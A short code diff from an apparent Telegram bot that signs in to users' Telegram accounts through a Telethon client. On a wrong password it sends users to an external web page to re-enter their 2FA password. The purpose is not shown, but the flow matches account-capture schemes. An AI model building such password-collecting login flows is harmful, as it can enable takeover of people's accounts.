@@ -459,24 +459,38 @@ async def password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(password=password_text)
 
-        # очищаем пароль из памяти
         password_text = None
-
-    except Exception as e:
-
-        password_text = None
-
-        await client.disconnect()
 
         await update.message.reply_text(
-            f"❌ Ошибка пароля:\n{e}"
+            "✅ Аккаунт успешно подключен.",
+            reply_markup=menu
         )
 
-        return ConversationHandler.END
+        return await finish_account(update, context)
 
-    password_text = None
+    except Exception:
 
-    return await finish_account(update, context)
+        password_text = None
+
+        await update.message.reply_text(
+            "❌ Неверный пароль 2FA.\n\nПопробуй еще раз.",
+            reply_markup=ReplyKeyboardMarkup(
+                [
+                    [
+                        KeyboardButton(
+                            "🔐 Ввести 2FA пароль",
+                            web_app=WebAppInfo(
+                                url="https://story-tg-fbm0.onrender.com/webapp/2fa.html"
+                            )
+                        )
+                    ]
+                ],
+                resize_keyboard=True,
+                one_time_keyboard=True
+            )
+        )
+
+        return PASSWORD
 
 
 async def finish_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
